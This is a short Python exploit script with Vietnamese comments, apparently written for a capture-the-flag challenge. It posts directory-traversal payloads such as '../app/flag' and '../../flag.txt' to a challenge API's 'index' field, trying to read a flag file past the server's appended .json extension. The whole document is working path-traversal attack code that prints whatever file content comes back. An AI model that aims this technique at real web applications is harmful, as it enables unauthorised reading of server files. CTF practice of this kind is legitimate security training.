import requests

url = "https://travel.ctf.pascalctf.it/api/get_json"

# Danh sách các tên file nghi vấn (Server sẽ tự cộng thêm .json)
candidates = [
    "../app/flag",           # -> tìm ../app/flag.json
    "../app/flag.txt",       # -> tìm ../app/flag.txt.json (Biết đâu admin đặt tên như vầy?)
    "../flag",               # -> tìm ../flag.json
    "../flag.txt",           # -> tìm ../flag.txt.json
    "../../flag",
    "../../flag.txt"
]

print(f"[*] Checking extensions on: {url}")
for p in candidates:
    try:
        r = requests.post(url, json={"index": p})
        if r.status_code == 200:
            print(f"[!!!] SUCCESS FOUND: {p}")
            print(f"Content: {r.text}")
        elif "File not found" not in r.text:
            print(f"[?] Weird response for {p}: {r.status_code}")
        else:
            print(f"[-] Not found: {p}")
    except Exception as e:
        print(e)